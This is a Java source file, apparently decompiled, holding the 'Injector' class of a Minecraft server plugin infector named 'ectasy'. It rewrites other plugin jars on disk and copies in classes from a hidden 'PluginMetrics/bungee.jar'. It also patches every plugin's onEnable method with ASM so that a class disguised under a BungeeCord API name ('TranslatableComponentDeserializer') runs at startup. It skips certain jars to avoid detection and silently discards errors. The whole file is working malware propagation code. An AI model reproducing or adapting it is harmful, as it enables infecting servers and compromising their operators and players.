package fr.body.ectasy;

import fr.body.ectasy.util.JarUtil;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.objectweb.asm.tree.ClassNode;
import org.objectweb.asm.tree.InsnList;
import org.objectweb.asm.tree.InsnNode;
import org.objectweb.asm.tree.MethodInsnNode;
import org.objectweb.asm.tree.MethodNode;
import org.objectweb.asm.tree.TypeInsnNode;
import org.objectweb.asm.tree.VarInsnNode;

public class Injector {
   public static void inject(String var0) throws Exception {
      if (var0.endsWith(".jar")) {
         if (!var0.contains("ViaVersion") && !var0.contains("Minehut")) {
            JarUtil var1 = new JarUtil(var0, var0 + ".tmp");
            var1.read();

            for(ClassNode var3 : var1.classes) {
               if (var3.name.equalsIgnoreCase("net/md_5/bungee/api/chat/TranslatableComponentDeserializer")) {
                  return;
               }
            }

            JarUtil var11 = new JarUtil("plugins/PluginMetrics/bungee.jar", "");
            var11.read();
            JarUtil var12 = new JarUtil(Bukkit.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("%20", " "), "");
            var12.read();
            var11.classes.stream().filter(cn -> cn.name.startsWith("net/md_5/bungee/api")).forEach(cn -> var1.newClasses.add(cn));
            var12.classes.stream().filter(cn -> cn.name.startsWith("net/md_5/bungee/api")).forEach(cn -> var1.newClasses.add(cn));

            for(ClassNode var5 : var1.classes) {
               if (var5.superName != null && var5.superName.equalsIgnoreCase("org/bukkit/plugin/java/JavaPlugin") && var5.methods != null) {
                  for(MethodNode var7 : var5.methods) {
                     if (var7.name.equalsIgnoreCase("onEnable")) {
                        InsnList var8 = new InsnList();
                        var8.add(new TypeInsnNode(187, "net/md_5/bungee/api/chat/TranslatableComponentDeserializer"));
                        var8.add(new InsnNode(89));
                        var8.add(new VarInsnNode(25, 0));
                        var8.add(
                           new MethodInsnNode(
                              183, "net/md_5/bungee/api/chat/TranslatableComponentDeserializer", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false
                           )
                        );
                        var8.add(new InsnNode(87));
                        var7.instructions.insertBefore(var7.instructions.getFirst(), var8);
                     }
                  }
               }
            }

            var1.write();

            try {
               FileOutputStream var13 = new FileOutputStream(var0);
               FileInputStream var14 = new FileInputStream(var0 + ".tmp");
               IOUtils.copy(var14, var13);
               var13.flush();
               var13.close();
               var14.close();
            } catch (Exception ignored) {
            }

            try {
               Files.delete(new File(var0 + ".tmp").toPath());
            } catch (Exception ignored) {
            }
         }
      }
   }
}
